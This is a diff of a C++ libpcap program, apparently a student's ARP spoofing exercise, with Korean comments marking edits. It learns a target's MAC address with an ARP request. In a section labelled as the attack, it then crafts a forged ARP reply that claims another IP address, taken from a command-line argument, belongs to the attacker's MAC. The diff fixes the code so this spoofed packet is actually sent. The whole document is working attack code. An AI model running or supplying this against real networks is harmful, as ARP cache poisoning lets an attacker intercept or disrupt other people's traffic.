@@ -150,7 +150,7 @@ int main(int argc, char* argv[]) {
    packet.arp_.sip_ = htonl(Ip(myIP));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(argv[2]));
-
+   /*수정한 부분 패킷 전송부분 추가*/
    int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res_send != 0) {
       fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
@@ -169,6 +169,7 @@ int main(int argc, char* argv[]) {
         if(ntohs(NewPacket->eth_.type_) == 0x0806){
             uint32_t sIp = htonl((uint32_t)NewPacket->arp_.sip_);
             //printf("%d\n",sIp);
+           /*수정한 부분*/
             char sip[40] = {0,};
             sprintf(sip, 
             "%d.%d.%d.%d", 
@@ -182,22 +183,23 @@ int main(int argc, char* argv[]) {
         }
     }
     //////////////공격//////////////////////////////
-    printf("Attack\n");
-    EthArpPacket packet1;
-    packet1.eth_.type_ = htons(EthHdr::Arp);
-    packet1.eth_.smac_ = Mac(get_mac_address());
-    packet1.eth_.dmac_ = attack;
-    packet1.arp_.tmac_ = attack;
+   printf("Attack\n");
+   EthArpPacket packet1;
+   packet1.eth_.type_ = htons(EthHdr::Arp);
+   packet1.eth_.smac_ = Mac(get_mac_address());
+   packet1.eth_.dmac_ = attack;
+   packet1.arp_.tmac_ = attack;
     
    packet1.arp_.op_ = htons(ArpHdr::Reply);
    packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet1.arp_.pro_ = htons(EthHdr::Ip4);
    packet1.arp_.hln_ = Mac::SIZE;
    packet1.arp_.pln_ = Ip::SIZE;
-   packet1.arp_.sip_ = htonl(Ip(argv[3]));
+   packet1.arp_.sip_ = htonl(Ip(argv[3]));/*수정한 부분 인자 바뀜*/
    packet1.arp_.smac_ = Mac(get_mac_address());
-   packet1.arp_.tip_ = htonl(Ip(argv[2]));
-
+   packet1.arp_.tip_ = htonl(Ip(argv[2]));/*수정한 부분*/
+   
+  /*수정한 부분 &packet1 공격패킷을 전송하도록함*/
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
    if (res != 0) {
       fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
